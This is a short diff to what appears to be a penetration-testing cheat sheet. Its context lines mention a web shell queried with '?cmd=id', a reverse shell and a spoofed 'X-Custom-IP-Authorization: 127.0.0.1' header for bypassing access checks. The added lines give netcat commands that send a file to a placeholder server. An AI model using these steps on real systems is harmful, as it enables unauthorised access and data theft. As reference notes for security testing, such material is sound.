@@ -197,5 +197,10 @@ access it + ?cmd=id, reverse shell
 Adding this header to attempt Http Web Tampering:
 X-Custom-IP-Authorization: 127.0.0.1
 
+###Sending File
+On your server (A):
+nc -l -p 1234 -q 1 > something.zip < /dev/null
+On your "sender client" (B):
+cat something.zip | netcat server.ip.here 1234
 
 
